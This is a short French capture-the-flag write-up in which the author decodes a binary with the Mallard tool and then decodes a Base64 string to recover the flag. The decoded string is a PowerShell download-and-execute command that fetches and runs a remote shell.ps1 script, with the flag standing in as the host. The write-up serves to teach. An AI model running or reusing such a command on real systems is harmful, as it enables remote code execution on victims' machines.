# Write-up – Reverse Challenge

## Introduction

Ce challenge de reverse engineering consiste à extraire un **flag** caché dans un fichier binaire (`inject.bin`). Le processus de résolution comporte deux  étapes : l'utilisation de l'outil **Mallard** pour décoder le binaire, puis le décodage d'une **chaîne Base64** extraite.

---

## Étape 1 : Décodage du fichier `inject.bin`

Le fichier `inject.bin` contient des données encodées.
Pour décoder ce fichier, nous allons utiliser l'outil open-source [Mallard](https://github.com/dagonis/Mallard).

### Procédure :
1. Ouvrir un **terminal PowerShell**.
2. Cloner le dépôt GitHub de Mallard :
   ```bash
   git clone https://github.com/dagonis/Mallard
    ```
3. Entrer la commande :
    ```bash
   python3 mallard -f <path_to_file_inject.bin>
    ```

## Étape 2 : Décodage de la chaîne Base64

Le contenu obtenu contient une chaîne encodée en Base64.
   ```bash
   SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMjRIe1QwdXRfM3N0X0NAc3MzfS9zaGVsbC5wczEnKQ==
```
On peut utiliser le site [CyberChef](https://gchq.github.io/CyberChef/) pour décoder la chaine.
On peut alors trouver le flag dans la chaine décodée.
   ```bash
   IEX (New-Object Net.WebClient).DownloadString('http://24HIUT{T0ut_3st_C@ss3}/shell.ps1')
```

## Flag

Le flag est : ```24HIUT{T0ut_3st_C@ss3}```